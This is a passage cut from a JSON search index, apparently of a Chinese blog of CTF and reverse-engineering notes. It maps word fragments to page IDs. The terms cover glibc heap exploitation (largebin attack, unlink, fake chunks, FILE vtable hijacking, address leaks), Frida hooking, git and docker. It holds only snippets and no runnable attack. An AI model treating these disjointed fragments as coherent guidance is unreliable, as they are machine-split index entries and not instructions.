"这里等效为\",{\"1\":{\"81\":1}}],[\"这里tcache\",{\"1\":{\"71\":1}}],[\"这里testa和testb就同步运行了\",{\"1\":{\"67\":1}}],[\"这里很关键因为会检查前后chunk中\",{\"1\":{\"81\":1}}],[\"这里很绕建议直接看原文章的图\",{\"1\":{\"60\":1}}],[\"这里很多前提知识\",{\"1\":{\"22\":1}}],[\"这里称为g\",{\"1\":{\"60\":1}}],[\"这里最好直接去看原文\",{\"1\":{\"60\":1}}],[\"这里num为1就是让ba25a9d\",{\"1\":{\"59\":1}}],[\"这里只是浅浅展示一下基础会用到的指令\",{\"1\":{\"43\":1}}],[\"这里看名字就大概知道istextwidgetactive是检测\",{\"1\":{\"32\":1}}],[\"这里看教程大概就是\",{\"1\":{\"26\":1}}],[\"这里放不下\",{\"1\":{\"27\":1}}],[\"这里搜了去\",{\"1\":{\"27\":1}}],[\"这里学习到的\",{\"1\":{\"24\":1}}],[\"这里如果这个函数不是导出函数则我们通过偏移来获取这个函数这个步骤\",{\"1\":{\"23\":1}}],[\"这里会去找到程序中所有实现了指定类的对象\",{\"1\":{\"21\":1}}],[\"这里重载函数是java里面的一个特性\",{\"1\":{\"19\":1}}],[\"这里引用一下参考文章的列子\",{\"1\":{\"17\":1}}],[\"这里也可以在启动后再\",{\"1\":{\"14\":1}}],[\"这里的存储数据为0xc7df9b0041348000\",{\"1\":{\"255\":1}}],[\"这里的初始值几乎全部都是赋值的null\",{\"1\":{\"188\":1}}],[\"这里的vtable的值可以改变\",{\"1\":{\"184\":1}}],[\"这里的chunk3的地址要特殊一些\",{\"1\":{\"150\":1}}],[\"这里的function\",{\"1\":{\"236\":1}}],[\"这里的fd就是我们后面要free的任意chunk\",{\"1\":{\"162\":1,\"284\":1}}],[\"这里的fd\",{\"1\":{\"130\":1}}],[\"这里的fwd和bck记好了\",{\"1\":{\"101\":1}}],[\"这里的代码\",{\"1\":{\"110\":1}}],[\"这里的安全机制全是对unsortedbin中的chunk进行的检查\",{\"1\":{\"97\":1}}],[\"这里的num\",{\"1\":{\"59\":1}}],[\"这里的字段指的是类中定义的成员属性然后这里修改非静态的字段用到的是java\",{\"1\":{\"21\":1}}],[\"这里的\",{\"1\":{\"14\":1}}],[\"粗鄙理解\",{\"1\":{\"20\":1}}],[\"也是用于分页查看文件内容\",{\"1\":{\"249\":1}}],[\"也没有看见什么东西\",{\"1\":{\"248\":1}}],[\"也就相当于mov\",{\"1\":{\"219\":1}}],[\"也就是在dest函数下面写入对应的脚本\",{\"1\":{\"246\":1}}],[\"也就是动态共享库的路径\",{\"1\":{\"238\":1}}],[\"也就是会执行push\",{\"1\":{\"234\":1}}],[\"也就是标准文件流\",{\"1\":{\"211\":1}}],[\"也就是说其记录的指针不能被修改\",{\"1\":{\"184\":1}}],[\"也就是说我们的commit链长这个样子\",{\"1\":{\"58\":1}}],[\"也就是覆盖file结构体0xd8偏移位置的数据\",{\"1\":{\"170\":1}}],[\"也就是0x90大小的chunk\",{\"1\":{\"161\":1,\"283\":1}}],[\"也就是0x440位置存在fd和bk\",{\"1\":{\"150\":1,\"154\":1}}],[\"也就是我们要修改的chunk为chunk\",{\"1\":{\"153\":1}}],[\"也就是我们要选择的主线\",{\"1\":{\"59\":1}}],[\"也就是先free\",{\"1\":{\"152\":1}}],[\"也就是下一个chunk的prev\",{\"1\":{\"130\":1}}],[\"也就是下一个free的chunk\",{\"1\":{\"122\":1}}],[\"也就是检查fd\",{\"1\":{\"130\":1}}],[\"也就是payload的部分\",{\"1\":{\"123\":1}}],[\"也就是一个超大的chunk\",{\"1\":{\"114\":1}}],[\"也就是4\",{\"1\":{\"114\":1}}],[\"也就是\",{\"1\":{\"114\":1,\"236\":1}}],[\"也就是目标地址赋值victim\",{\"1\":{\"110\":1}}],[\"也就是fwd的bk为我们想要泄露到的目标地址\",{\"1\":{\"110\":1}}],[\"也就是当前我们要free的chunk\",{\"1\":{\"109\":1}}],[\"也就是当一个函数是异步状态的时候\",{\"1\":{\"65\":1}}],[\"也就是最低的地址为00\",{\"1\":{\"150\":1}}],[\"也就是最小的那个chunk\",{\"1\":{\"106\":1}}],[\"也就是最后一个加入tcache的chunk\",{\"1\":{\"72\":1}}],[\"也就是把bck提到fwd前方\",{\"1\":{\"104\":1}}],[\"也就是large\",{\"1\":{\"104\":1}}],[\"也就是chunk\",{\"1\":{\"104\":1}}],[\"也就是分割过一次\",{\"1\":{\"98\":1}}],[\"也就是unsortedbin中仅有一个chunk\",{\"1\":{\"98\":1}}],[\"也就是bck\",{\"1\":{\"95\":1}}],[\"也就是bin头部通过fd\",{\"1\":{\"93\":1}}],[\"也就是main\",{\"1\":{\"72\":1}}],[\"也就是正常的commit\",{\"1\":{\"61\":1}}],[\"也就是正常git\",{\"1\":{\"59\":1}}],[\"也就是通过merge合并分支产生的commit\",{\"1\":{\"59\":1}}],[\"也就是找到所有类型为这个类的对象\",{\"1\":{\"21\":1}}],[\"也就是你的项目采用的开源协议\",{\"1\":{\"8\":1}}],[\"也进行一样的操作\",{\"1\":{\"97\":1}}],[\"也属于一个堆块\",{\"1\":{\"72\":1}}],[\"也可以docker\",{\"1\":{\"43\":1}}],[\"也可以不写\",{\"1\":{\"20\":1}}],[\"也保持打开状态\",{\"1\":{\"43\":1}}],[\"重复上一次搜索\",{\"1\":{\"249\":2}}],[\"重要知识点\",{\"0\":{\"69\":1}}],[\"重构代码\",{\"1\":{\"50\":1}}],[\"重载方法的个数\",{\"1\":{\"19\":1}}],[\"重写add方法\",{\"1\":{\"17\":1}}],[\"不懂为什么这题就只有30多解\",{\"1\":{\"269\":1}}],[\"不清空屏幕\",{\"1\":{\"249\":1}}],[\"不折行长行\",{\"1\":{\"249\":1}}],[\"不太稳定\",{\"1\":{\"241\":1}}],[\"不去修改p\",{\"1\":{\"122\":1}}],[\"不轻易改变chunk\",{\"1\":{\"106\":1}}],[\"不符\",{\"1\":{\"97\":1}}],[\"不能小于2\",{\"1\":{\"97\":1}}],[\"不能以后每次都这样操作\",{\"1\":{\"57\":1}}],[\"不大于\",{\"1\":{\"69\":1}}],[\"不然会出问题\",{\"1\":{\"60\":1}}],[\"不同的参数列表\",{\"1\":{\"19\":1}}],[\"不管是实例方法还是静态方法都可以\",{\"1\":{\"17\":1}}],[\"ndouble\",{\"1\":{\"276\":1}}],[\"ndelete\",{\"1\":{\"273\":1}}],[\"n$p来实现指定第几个参数地址写入内容\",{\"1\":{\"261\":1}}],[\"nx\",{\"1\":{\"254\":2}}],[\"nssctf\",{\"0\":{\"306\":1},\"1\":{\"254\":1,\"256\":1}}],[\"nshow一个\",{\"1\":{\"154\":1}}],[\"nl命令\",{\"1\":{\"249\":1}}],[\"nc签到题\",{\"0\":{\"248\":1}}],[\"ncores\",{\"1\":{\"137\":2}}],[\"n删除一个\",{\"1\":{\"154\":1}}],[\"n删除index为\",{\"1\":{\"143\":1,\"144\":1,\"276\":1,\"288\":1}}],[\"n添加index为\",{\"1\":{\"143\":1,\"144\":1,\"276\":1,\"288\":1}}],[\"nprocs\",{\"1\":{\"137\":1}}],[\"nfastbins\",{\"1\":{\"132\":1}}],[\"nbins\",{\"1\":{\"132\":1}}],[\"nb\",{\"1\":{\"90\":4,\"98\":6,\"100\":2,\"105\":1,\"106\":5,\"107\":1,\"137\":1}}],[\"n\",{\"1\":{\"75\":2,\"132\":1,\"137\":7,\"143\":8,\"144\":8,\"154\":9,\"182\":5,\"234\":1,\"236\":2,\"245\":4,\"246\":37,\"247\":29,\"249\":5,\"255\":2,\"256\":1,\"258\":10,\"260\":10,\"264\":7,\"265\":11,\"266\":6,\"267\":6,\"268\":9,\"269\":6,\"271\":7,\"273\":10,\"276\":9,\"288\":9,\"289\":7,\"290\":6}}],[\"null漏洞\",{\"1\":{\"79\":1}}],[\"null\",{\"1\":{\"71\":1,\"98\":2,\"106\":2,\"109\":3,\"124\":2,\"127\":1,\"129\":2,\"137\":2,\"138\":2,\"188\":4,\"195\":12,\"204\":1,\"224\":1,\"226\":1,\"243\":2}}],[\"num2\",{\"1\":{\"75\":1}}],[\"num的值为\",{\"1\":{\"66\":1}}],[\"num+=\",{\"1\":{\"66\":2}}],[\"num我们可以通过git\",{\"1\":{\"59\":1}}],[\"numbers\",{\"1\":{\"249\":1}}],[\"number\",{\"1\":{\"21\":7,\"132\":1,\"137\":1,\"223\":1,\"254\":1,\"256\":1}}],[\"num\",{\"1\":{\"19\":1,\"59\":1,\"66\":5,\"73\":1,\"74\":1,\"75\":4,\"118\":2,\"223\":1,\"224\":11,\"226\":7,\"227\":5,\"288\":2}}],[\"ntustisc\",{\"0\":{\"116\":1,\"126\":1}}],[\"nt\",{\"1\":{\"58\":2}}],[\"net\",{\"1\":{\"268\":1}}],[\"netease\",{\"1\":{\"26\":1,\"27\":5,\"29\":1}}],[\"necessary\",{\"1\":{\"213\":1}}],[\"never\",{\"1\":{\"109\":1}}],[\"next链接的是非主分配区\",{\"1\":{\"132\":1}}],[\"nextinuse\",{\"1\":{\"109\":3}}],[\"nextchunk和nextsize\",{\"1\":{\"109\":1}}],[\"nextchunk\",{\"1\":{\"109\":11,\"130\":1}}],[\"nextsize这几个组成\",{\"1\":{\"114\":1}}],[\"nextsize=victim也就是目标地址等于victim\",{\"1\":{\"110\":1}}],[\"nextsize等于目标地址\",{\"1\":{\"110\":1}}],[\"nextsize为目标地址\",{\"1\":{\"110\":1}}],[\"nextsize为null\",{\"1\":{\"109\":1}}],[\"nextsize链接\",{\"1\":{\"93\":1}}],[\"nextsize\",{\"1\":{\"93\":3,\"98\":2,\"104\":16,\"106\":6,\"109\":9,\"110\":17,\"114\":1,\"129\":23}}],[\"next8\",{\"1\":{\"77\":1}}],[\"next12\",{\"1\":{\"77\":1}}],[\"next\",{\"1\":{\"71\":1,\"75\":1,\"81\":1,\"97\":10,\"109\":4,\"124\":1,\"129\":1,\"130\":2,\"132\":6,\"134\":2,\"138\":2,\"143\":3,\"144\":3,\"223\":2}}],[\"needed\",{\"1\":{\"241\":1}}],[\"need\",{\"1\":{\"27\":1,\"55\":1}}],[\"newthread\",{\"1\":{\"244\":3}}],[\"newom\",{\"1\":{\"58\":1}}],[\"new\",{\"0\":{\"138\":2},\"1\":{\"20\":2,\"133\":1,\"134\":1,\"135\":2,\"137\":2,\"138\":6,\"180\":7,\"188\":13,\"192\":1,\"195\":2,\"196\":2,\"198\":1,\"201\":2,\"202\":2,\"204\":2,\"241\":2}}],[\"nadd\",{\"1\":{\"273\":1}}],[\"nadd一个\",{\"1\":{\"154\":1}}],[\"narenas\",{\"1\":{\"137\":15}}],[\"nativesendmessagetojs\",{\"1\":{\"30\":1}}],[\"nativejscall\",{\"1\":{\"30\":1}}],[\"nativepointer\",{\"1\":{\"23\":1}}],[\"name获取我们需要的函数名字在\",{\"1\":{\"236\":1}}],[\"name就是我们需要的函数名了\",{\"1\":{\"236\":1}}],[\"names\",{\"1\":{\"43\":1}}],[\"name=\",{\"1\":{\"23\":1,\"43\":1}}],[\"name\",{\"1\":{\"20\":1,\"21\":5,\"22\":4,\"23\":1,\"27\":6,\"29\":1,\"43\":1,\"46\":2,\"77\":1,\"236\":5,\"240\":1,\"241\":2,\"249\":2,\"258\":6,\"260\":4,\"264\":4,\"265\":7,\"266\":6,\"267\":4,\"268\":5,\"269\":10,\"270\":3,\"271\":4,\"273\":4,\"276\":4,\"288\":4,\"289\":4,\"290\":4}}],[\"name来调用原本的函数\",{\"1\":{\"18\":1}}],[\"nickname+\",{\"1\":{\"21\":1}}],[\"nickname\",{\"1\":{\"21\":4}}],[\"nop指令不重要\",{\"1\":{\"267\":1}}],[\"node5\",{\"1\":{\"256\":1}}],[\"noutput\",{\"1\":{\"247\":1}}],[\"noreturn\",{\"1\":{\"245\":1}}],[\"normal\",{\"1\":{\"109\":1,\"132\":1}}],[\"nomask\",{\"1\":{\"97\":2,\"104\":3,\"106\":3,\"109\":3,\"129\":1}}],[\"non\",{\"1\":{\"90\":1,\"98\":1,\"106\":2,\"109\":1,\"175\":2,\"193\":2}}],[\"none\",{\"1\":{\"66\":1}}],[\"nothing\",{\"1\":{\"137\":1}}],[\"note\",{\"1\":{\"55\":1,\"71\":1,\"132\":1,\"260\":3}}],[\"notes\",{\"1\":{\"55\":1}}],[\"not\",{\"1\":{\"43\":2,\"46\":2,\"106\":1,\"109\":6,\"124\":2,\"127\":1,\"129\":1,\"132\":2,\"134\":1,\"137\":2,\"138\":1,\"176\":1,\"213\":1}}],[\"no\",{\"0\":{\"194\":1},\"1\":{\"14\":3,\"27\":3,\"137\":2,\"165\":1,\"188\":2,\"195\":3,\"249\":1,\"254\":2,\"287\":1,\"288\":1}}],[\"上一个chunk的大小否则\",{\"1\":{\"114\":1}}],[\"上一个chunk处于free状态的时候来表示\",{\"1\":{\"114\":1}}],[\"上面举的列子\",{\"1\":{\"18\":1}}],[\"上篇学习了git的规范\",{\"1\":{\"1\":1}}],[\"=35002\",{\"1\":{\"268\":1}}],[\"=base\",{\"1\":{\"288\":1}}],[\"=b\",{\"1\":{\"264\":2,\"289\":1,\"290\":1}}],[\"=>\",{\"1\":{\"241\":1}}],[\"=system\",{\"1\":{\"189\":1}}],[\"==>之前\",{\"1\":{\"241\":1}}],[\"==\",{\"1\":{\"81\":4,\"98\":2,\"106\":1,\"109\":5,\"124\":2,\"127\":2,\"129\":2,\"130\":2,\"137\":3,\"138\":2,\"163\":1,\"188\":1,\"202\":1,\"211\":2,\"254\":1,\"285\":1}}],[\"=\",{\"1\":{\"17\":1,\"19\":1,\"20\":2,\"21\":4,\"22\":2,\"27\":4,\"46\":1,\"64\":4,\"66\":4,\"71\":1,\"75\":5,\"81\":13,\"90\":10,\"91\":1,\"95\":4,\"97\":7,\"98\":11,\"99\":2,\"100\":2,\"102\":4,\"103\":5,\"104\":23,\"106\":20,\"107\":1,\"109\":36,\"110\":13,\"124\":19,\"127\":5,\"129\":20,\"130\":8,\"134\":2,\"136\":4,\"137\":9,\"138\":21,\"143\":16,\"144\":16,\"154\":18,\"158\":3,\"162\":6,\"163\":3,\"165\":5,\"180\":3,\"182\":14,\"188\":4,\"192\":1,\"193\":90,\"195\":16,\"196\":2,\"198\":1,\"202\":4,\"204\":1,\"213\":3,\"224\":13,\"226\":7,\"227\":6,\"231\":1,\"236\":6,\"244\":3,\"246\":2,\"247\":6,\"248\":4,\"254\":1,\"255\":2,\"256\":3,\"258\":31,\"260\":24,\"264\":28,\"265\":19,\"266\":20,\"267\":22,\"268\":23,\"269\":19,\"270\":8,\"271\":21,\"273\":24,\"276\":32,\"280\":3,\"284\":6,\"285\":3,\"287\":5,\"288\":48,\"289\":26,\"290\":28}}],[\"=function\",{\"1\":{\"17\":1,\"18\":1}}],[\"<<\",{\"1\":{\"288\":1}}],[\"<main+62>\",{\"1\":{\"255\":1}}],[\"<method>\",{\"1\":{\"17\":1,\"18\":2}}],[\"<pthread\",{\"1\":{\"243\":1}}],[\"<repeats\",{\"1\":{\"193\":1}}],[\"<string\",{\"1\":{\"182\":1,\"189\":1}}],[\"<stdio\",{\"1\":{\"75\":1,\"189\":1,\"247\":1}}],[\"<=\",{\"1\":{\"97\":1,\"109\":4,\"124\":2,\"137\":1,\"211\":2,\"244\":2,\"246\":1,\"288\":1}}],[\"<=>\",{\"1\":{\"81\":6}}],[\"<\",{\"1\":{\"27\":1,\"75\":2,\"95\":1,\"97\":1,\"100\":1,\"104\":2,\"106\":2,\"109\":3,\"127\":2,\"196\":1,\"247\":1,\"248\":1,\"255\":1}}],[\"<function>\",{\"1\":{\"19\":1}}],[\"<class>\",{\"1\":{\"19\":1}}],[\"<wrapper>\",{\"1\":{\"17\":1,\"18\":1}}],[\"我可能会选择这样\",{\"1\":{\"186\":1}}],[\"我选择了将topchunk消耗完毕触发合并的方式\",{\"1\":{\"161\":1,\"283\":1}}],[\"我这边采用的arahat0佬的劫持\",{\"1\":{\"157\":1,\"279\":1}}],[\"我这里的理解是如提交pr的时候先挂着\",{\"1\":{\"54\":1}}],[\"我直接copy了\",{\"1\":{\"115\":1}}],[\"我是大概浏览的\",{\"1\":{\"108\":1}}],[\"我在这里\",{\"1\":{\"95\":1}}],[\"我在以前都忽略了readme的存在于是系统学习学习参考文章一个开源项目的readme文档应该包含哪些信息才算是一份合格的文档\",{\"1\":{\"1\":1}}],[\"我继续基于我的分支进行了fix\",{\"1\":{\"60\":1}}],[\"我以为是docker无法链接外部网络的问题\",{\"1\":{\"46\":1}}],[\"我犯蠢了\",{\"1\":{\"30\":1}}],[\"我们malloc一个巨无霸然后就可以覆写fastbin\",{\"1\":{\"276\":1}}],[\"我们再申请为\",{\"1\":{\"275\":1}}],[\"我们再将这个大chunk\",{\"1\":{\"273\":1}}],[\"我们劫持head\",{\"1\":{\"275\":1}}],[\"我们不太方便伪造fake\",{\"1\":{\"273\":1}}],[\"我们用栈传递参数让rdx赋值给rdi\",{\"1\":{\"267\":1}}],[\"我们通过提前在栈里面写满backdoor地址\",{\"1\":{\"265\":1}}],[\"我们通过连续申请8个gundam\",{\"1\":{\"72\":1}}],[\"我们选择打exit\",{\"1\":{\"261\":1}}],[\"我们选择返回一个future对象\",{\"1\":{\"65\":1}}],[\"我们手搓一个程序\",{\"1\":{\"255\":1}}],[\"我们猜测是每个函数要等待上一个函数执行完毕再执行\",{\"1\":{\"245\":1}}],[\"我们点入value变量\",{\"1\":{\"245\":1}}],[\"我们假设我们的函数在plt\",{\"1\":{\"234\":1}}],[\"我们程序究竟是怎么运行的\",{\"1\":{\"234\":1}}],[\"我们来到了leave\",{\"1\":{\"231\":1}}],[\"我们来详细分析一下这个流程中究竟干了什么\",{\"1\":{\"110\":1}}],[\"我们在ebp这个位置放入我们我们希望这个栈最终落脚点\",{\"1\":{\"231\":1}}],[\"我们带符号打印一下\",{\"1\":{\"216\":1}}],[\"我们对\",{\"1\":{\"199\":1}}],[\"我们如何设计一个结构体\",{\"1\":{\"186\":1}}],[\"我们喜欢把write\",{\"1\":{\"185\":1}}],[\"我们要伪造三个chunk\",{\"1\":{\"181\":1}}],[\"我们看看这个函数的调用链\",{\"1\":{\"180\":1}}],[\"我们结合结构体来理解一下\",{\"1\":{\"173\":1}}],[\"我们的fd需要经过与\",{\"1\":{\"163\":1,\"285\":1}}],[\"我们的size得>=2\",{\"1\":{\"124\":1}}],[\"我们需要修改的plt条目的位置\",{\"1\":{\"236\":1}}],[\"我们需要控制内存对齐\",{\"1\":{\"163\":1,\"285\":1}}],[\"我们需要利用\",{\"1\":{\"152\":1}}],[\"我们只需要让rdx寄存器的值给rdi\",{\"1\":{\"267\":1}}],[\"我们只需要malloc回来即可\",{\"1\":{\"158\":1,\"280\":1}}],[\"我们只要能够实现这两个部分就可以了\",{\"1\":{\"231\":1}}],[\"我们只处理这一种情况\",{\"1\":{\"106\":1}}],[\"我们把我们构造的chunk叫做fake\",{\"1\":{\"150\":1}}],[\"我们一次性只能new一个0xff大小的chunk\",{\"1\":{\"142\":1}}],[\"我们修改fwd的bk\",{\"1\":{\"110\":1}}],[\"我们修改largebin中的chunk\",{\"1\":{\"110\":1}}],[\"我们主要探讨在第一次数据绑定的时候\",{\"1\":{\"234\":1}}],[\"我们主要的利用都是这里\",{\"1\":{\"210\":1}}],[\"我们主要利用这两行代码\",{\"1\":{\"110\":1}}],[\"我们主要是利用\",{\"1\":{\"110\":1}}],[\"我们large\",{\"1\":{\"106\":1}}],[\"我们应该先调整fwd和bck\",{\"1\":{\"104\":1}}],[\"我们从unsortedbin抠出来的chunk就要合并进入fwd和bck的中间\",{\"1\":{\"101\":1}}],[\"我们会发现fd和bk都是指向了自己本身也就是main\",{\"1\":{\"96\":1}}],[\"我们清空unsortedbin看看\",{\"1\":{\"96\":1}}],[\"我们先把unsorted\",{\"1\":{\"142\":1}}],[\"我们先理清楚largebin的结构\",{\"1\":{\"93\":1}}],[\"我们先通过指令查到我们的包名\",{\"1\":{\"29\":1}}],[\"我们就相当于chunk的p为0也就是我们构造的fake\",{\"1\":{\"130\":1}}],[\"我们就能够泄露victim的地址\",{\"1\":{\"110\":1}}],[\"我们就可以malloc一个\",{\"1\":{\"91\":1}}],[\"我们就列举一些目前逆向过程中遇见的\",{\"1\":{\"39\":1}}],[\"我们可以让head\",{\"1\":{\"275\":1}}],[\"我们可以直接劫持gift函数和hello\",{\"1\":{\"274\":1}}],[\"我们可以利用合并机制\",{\"1\":{\"273\":1}}],[\"我们可以利用rep\",{\"1\":{\"267\":1}}],[\"我们可以利用delete后没有清空的特性将原本的头chunk覆盖掉\",{\"1\":{\"159\":1,\"281\":1}}],[\"我们可以第一次写入目标地址\",{\"1\":{\"261\":1}}],[\"我们可以另外再想办法\",{\"1\":{\"214\":1}}],[\"我们可以在伪造的file结构体0xa0位置填写上可控的一个chunk地址\",{\"1\":{\"180\":1}}],[\"我们可以通过\",{\"1\":{\"261\":1}}],[\"我们可以通过reloc\",{\"1\":{\"236\":1}}],[\"我们可以通过向scanf输入大量数据\",{\"1\":{\"161\":1,\"283\":1}}],[\"我们可以通过让topchunk消耗完毕\",{\"1\":{\"161\":1,\"283\":1}}],[\"我们可以通过申请large\",{\"1\":{\"161\":1,\"283\":1}}],[\"我们可以看见我们相对熟悉的fastbinsy和bins也就是我们接触最多的fastbin\",{\"1\":{\"132\":1}}],[\"我们可以发现rdx已经有了我们执行shellcode的地址\",{\"1\":{\"267\":1}}],[\"我们可以发现这里的条件主要是两部分\",{\"1\":{\"211\":1}}],[\"我们可以发现这里就没有vatble的检查了\",{\"1\":{\"180\":1}}],[\"我们可以发现这个调用最终会调用io\",{\"1\":{\"179\":1}}],[\"我们可以发现这个地方fd和bk都指向了\",{\"1\":{\"72\":1}}],[\"我们可以发现调用这个的时候并不存在vatble的检查\",{\"1\":{\"180\":1}}],[\"我们可以发现\",{\"1\":{\"110\":1}}],[\"我们可以调试看看\",{\"1\":{\"95\":1}}],[\"我们可以简化一下\",{\"1\":{\"93\":1}}],[\"我们可以明显发现\",{\"1\":{\"88\":1}}],[\"我们可以知道\",{\"1\":{\"40\":1,\"124\":1}}],[\"我们这里开始简单运算一下\",{\"1\":{\"77\":1}}],[\"我们这里知道了第七个地址\",{\"1\":{\"72\":1}}],[\"我们这里选择修改nickname这个属性\",{\"1\":{\"21\":1}}],[\"我们直接malloc一个大小一样的chunk\",{\"1\":{\"269\":1}}],[\"我们直接使用平替函数\",{\"1\":{\"268\":1}}],[\"我们直接输入指令\",{\"1\":{\"59\":1}}],[\"我们直接通过mprotect函数\",{\"1\":{\"289\":1}}],[\"我们直接通过\",{\"1\":{\"17\":1}}],[\"我们为什么需要它\",{\"1\":{\"55\":1}}],[\"我们使用\",{\"1\":{\"43\":1}}],[\"我们成功筛选出我们的主activity\",{\"1\":{\"40\":1}}],[\"我们有两个特征值\",{\"1\":{\"40\":1}}],[\"我们执行指令\",{\"1\":{\"27\":1}}],[\"我们首先要获取它的包名提前声明这里实战\",{\"1\":{\"24\":1}}],[\"我们调试一个程序的时候\",{\"1\":{\"24\":1}}],[\"je\",{\"1\":{\"268\":2}}],[\"jrs\",{\"1\":{\"248\":1}}],[\"j\",{\"1\":{\"244\":4}}],[\"join\",{\"1\":{\"243\":3,\"244\":1}}],[\"jollywing\",{\"1\":{\"237\":1}}],[\"jmpi后就是跳转到go+0x90000\",{\"1\":{\"220\":1}}],[\"jmpi\",{\"1\":{\"220\":1}}],[\"jmp\",{\"1\":{\"195\":2,\"234\":4,\"268\":4}}],[\"jump都是同一个vtable\",{\"1\":{\"188\":1}}],[\"jump1\",{\"1\":{\"179\":2}}],[\"jump\",{\"1\":{\"175\":1,\"180\":63,\"184\":2,\"186\":23,\"193\":1,\"195\":1,\"213\":2}}],[\"jumps数据进行查看一下\",{\"1\":{\"199\":1}}],[\"jumps>\",{\"1\":{\"196\":1}}],[\"jumps的\",{\"1\":{\"172\":1}}],[\"jumps地址\",{\"1\":{\"170\":1,\"173\":1}}],[\"jumps\",{\"1\":{\"169\":1,\"172\":2,\"179\":3,\"180\":11,\"182\":6,\"188\":3,\"195\":1,\"198\":2}}],[\"just\",{\"1\":{\"71\":1,\"138\":1}}],[\"jailed\",{\"1\":{\"27\":1}}],[\"java会自动给你补上\",{\"1\":{\"20\":1}}],[\"java\",{\"1\":{\"17\":2,\"21\":2,\"22\":1,\"27\":3,\"30\":3}}],[\"json\",{\"1\":{\"43\":1}}],[\"js代码\",{\"1\":{\"19\":1}}],[\"js代码的书写\",{\"0\":{\"15\":1}}],[\"js\",{\"1\":{\"14\":2,\"27\":2}}],[\"js脚本\",{\"0\":{\"13\":1}}],[\"附着脚本\",{\"0\":{\"14\":1}}],[\"url\",{\"1\":{\"258\":2,\"260\":2,\"264\":2,\"265\":2,\"266\":2,\"267\":2,\"268\":2,\"269\":2,\"270\":2,\"271\":2,\"273\":2,\"276\":2,\"288\":2,\"289\":2,\"290\":2}}],[\"uflow\",{\"1\":{\"180\":6,\"186\":1}}],[\"u64\",{\"1\":{\"154\":1,\"158\":2,\"258\":1,\"260\":3,\"264\":1,\"265\":1,\"266\":2,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":3,\"276\":2,\"280\":2,\"288\":4,\"289\":1,\"290\":1}}],[\"uu64\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"uu32\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"u32\",{\"1\":{\"154\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":1,\"268\":1,\"269\":1,\"271\":1,\"273\":1,\"276\":1,\"288\":1,\"289\":1,\"290\":1}}],[\"uintptr\",{\"1\":{\"109\":2,\"213\":2}}],[\"up\",{\"1\":{\"75\":1,\"138\":1,\"175\":1,\"193\":1}}],[\"update时提示400\",{\"1\":{\"46\":1}}],[\"updates\",{\"1\":{\"46\":1}}],[\"unr4v31\",{\"1\":{\"235\":1}}],[\"unregister\",{\"1\":{\"64\":1}}],[\"unrecognized\",{\"1\":{\"27\":1}}],[\"un\",{\"1\":{\"188\":1}}],[\"undo\",{\"1\":{\"175\":1,\"193\":1}}],[\"underflow\",{\"1\":{\"137\":1,\"180\":12,\"186\":3}}],[\"unused2\",{\"1\":{\"174\":1,\"193\":1}}],[\"unused\",{\"1\":{\"109\":1}}],[\"until\",{\"1\":{\"109\":1,\"202\":1}}],[\"unless\",{\"1\":{\"109\":2}}],[\"unlock\",{\"1\":{\"109\":2,\"124\":1,\"134\":2,\"136\":2,\"138\":2}}],[\"unlikely\",{\"1\":{\"90\":1,\"97\":8,\"104\":1,\"106\":1,\"109\":4,\"110\":1,\"127\":2,\"137\":2,\"213\":1}}],[\"unlink检查\",{\"1\":{\"147\":1}}],[\"unlink\",{\"1\":{\"80\":2,\"106\":1,\"109\":2,\"129\":1}}],[\"unlink+offbynull\",{\"0\":{\"76\":1}}],[\"unsafeunlink\",{\"0\":{\"130\":1}}],[\"unsigned\",{\"1\":{\"98\":2,\"104\":5,\"106\":4,\"109\":6,\"124\":2,\"132\":1,\"138\":2,\"193\":1,\"247\":1}}],[\"unsortedbin进入topchunk\",{\"1\":{\"158\":1,\"280\":1}}],[\"unsortedbin在合并的时候\",{\"1\":{\"129\":1}}],[\"unsortedbin\",{\"0\":{\"128\":1},\"1\":{\"96\":2,\"132\":1}}],[\"unsortedbin的合并\",{\"0\":{\"94\":1}}],[\"unsortedbin头结点\",{\"1\":{\"72\":1}}],[\"unsorted\",{\"1\":{\"70\":1,\"72\":1,\"95\":2,\"97\":7,\"98\":4,\"99\":2,\"106\":3,\"109\":3,\"115\":1,\"132\":1,\"142\":2}}],[\"unsortbin的fd和bk指向自身main\",{\"1\":{\"69\":1}}],[\"ubuntu\",{\"1\":{\"43\":4,\"46\":5}}],[\"ubuntu14\",{\"1\":{\"42\":1}}],[\"ubuntu16\",{\"1\":{\"42\":1,\"47\":2}}],[\"ubuntu18\",{\"1\":{\"42\":1}}],[\"ubuntu20\",{\"1\":{\"42\":1}}],[\"u\",{\"1\":{\"11\":1,\"14\":2,\"27\":1}}],[\"usr\",{\"1\":{\"238\":1,\"270\":1}}],[\"usage\",{\"0\":{\"4\":1},\"1\":{\"27\":1}}],[\"used\",{\"1\":{\"109\":4,\"175\":1,\"176\":1,\"193\":1,\"202\":1}}],[\"user\",{\"1\":{\"176\":1,\"270\":1}}],[\"user部分\",{\"1\":{\"86\":1}}],[\"users\",{\"1\":{\"27\":1,\"58\":1}}],[\"use\",{\"1\":{\"0\":1,\"17\":2,\"19\":2,\"20\":1,\"21\":1,\"22\":1,\"27\":1,\"109\":1,\"124\":1,\"193\":2,\"213\":1}}],[\"映射端口\",{\"0\":{\"10\":1}}],[\"|=\",{\"1\":{\"202\":2}}],[\"||\",{\"1\":{\"81\":1,\"97\":3,\"109\":5,\"124\":3,\"129\":2,\"130\":1,\"211\":1}}],[\"|\",{\"1\":{\"9\":1,\"27\":7,\"29\":1,\"47\":1,\"62\":1,\"96\":1,\"98\":3,\"106\":3,\"109\":2,\"138\":1,\"183\":1,\"222\":1,\"288\":1}}],[\"cmp\",{\"1\":{\"268\":2}}],[\"cmd\",{\"1\":{\"43\":1,\"154\":6}}],[\"cc\",{\"1\":{\"224\":2,\"226\":2}}],[\"cx\",{\"1\":{\"220\":1}}],[\"crash\",{\"1\":{\"195\":1}}],[\"create\",{\"1\":{\"137\":1,\"138\":1,\"243\":3,\"244\":4,\"260\":14}}],[\"